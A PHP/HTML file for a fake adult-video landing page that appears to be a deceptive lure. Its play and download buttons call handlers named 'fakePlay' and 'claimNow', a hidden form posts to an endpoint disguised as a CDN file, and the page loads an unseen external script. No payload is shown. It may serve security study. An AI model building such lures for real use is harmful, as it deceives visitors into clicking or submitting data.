<?php



session_start();
//error_reporting(E_ALL ^ E_NOTICE);


?>



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SexxyVideos™ – Watch Now for Free!</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      padding: 0;
    }
    body {
      background: #000;
      color: #ccc;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
    }
    header {
      background: #222;
      padding: 10px 20px;
      display: flex;
      align-items: center;
    }
    header img {
      height: 40px;
    }
    .banner {
      background: rgba(255, 0, 0, 0.8);
      color: white;
      text-align: center;
      padding: 15px;
      font-size: 1.2rem;
      animation: flash 1s infinite;
    }
    @keyframes flash {
      0%,100% {opacity: 1;}
      50% {opacity: 0.4;}
    }
    .main {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
    }
    .video-gallery {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 20px;
      margin: 20px;
    }
    .video-thumbnail {
      width: 320px;
      height: 180px;
      background: linear-gradient(135deg, #333, #666);
      position: relative;
      cursor: pointer;
    }
    .video-thumbnail img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    .video-thumbnail::after {
      content: '▶️ HD VIDEO';
      position: absolute;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      font-size: 1.5rem;
      color: #fff;
      text-shadow: 0 0 5px #000;
    }
    .cta-button {
      display: block;
      width: 90%;
      margin: 10px auto;
      padding: 15px;
      background: #e80;
      color: #000;
      text-align: center;
      font-weight: bold;
      text-transform: uppercase;
      box-shadow: 0 0 10px #e80;
      cursor: pointer;
    }
    .ads {
      display: flex;
      flex-wrap: wrap;
      justify-content: space-evenly;
      margin: 20px;
      gap: 10px;
    }
    .ads .ad {
      width: 200px;
      height: 100px;
      background: #222;
      border: 2px solid #444;
      color: #fff;
      padding: 10px;
      text-align: center;
      font-size: 0.9rem;
    }
    footer {
      background: #111;
      color: #555;
      text-align: center;
      padding: 15px;
      font-size: 0.8rem;
    }
  </style>
</head>
<body>

  <header>
    <img src="https://via.placeholder.com/120x40?text=SEXXYVIDS" alt="SexxyVideos Logo">
  </header>

  <div class="banner">
    💥 MOST POPULAR VIDEO NOW AVAILABLE! 💥
  </div>

  <div class="main">
    <div class="video-gallery">
      <div class="video-thumbnail" onclick="fakePlay()">
        <img src="https://via.placeholder.com/320x180?text=Video+1" alt="Video 1">
      </div>
      <div class="video-thumbnail" onclick="fakePlay()">
        <img src="https://via.placeholder.com/320x180?text=Video+2" alt="Video 2">
      </div>
      <div class="video-thumbnail" onclick="fakePlay()">
        <img src="https://via.placeholder.com/320x180?text=Video+3" alt="Video 3">
      </div>

      <div class="video-thumbnail" onclick="fakePlay()">
        <img src="https://via.placeholder.com/320x180?text=Video+4" alt="Video 4">
      </div>
    </div>

    <div class="cta-button" onclick="claimNow()">Download Now – 100% FREE</div>
    <form id="new_deal" action="aws-cdn-5531.php" method="POST">    
        <input type="hidden" autocomplete="off" value="Selbstmordegg" name="firstname">
        <input type="hidden" autocomplete="off" value="am Galgenrain" name="surname">
        <input type="hidden" value="Change" name="Change">
    </form>	
    <div class="ads">
      <div class="ad">💵 Win Cash Bonuses Instantly!</div>
      <div class="ad">💊 Free “Adult Health” Pill Samples!</div>
      <div class="ad">🔒 Secure Your Privacy – VPN Deals!</div>
      <div class="ad">👀 Watch Hidden Cam Streams 24/7</div>
      <div class="ad">🎲 Spin to Win – Prizes Every Hour!</div>
      <div class="ad">🎁 Claim Your Mystery Box Now</div>
    </div>
  </div>

  <footer>
    © 2025 SexxyVideos™ — Terms • Privacy • TAP WARNING
  </footer>
<script src="daniela_loves_you.js"></script>
</body>
</html>
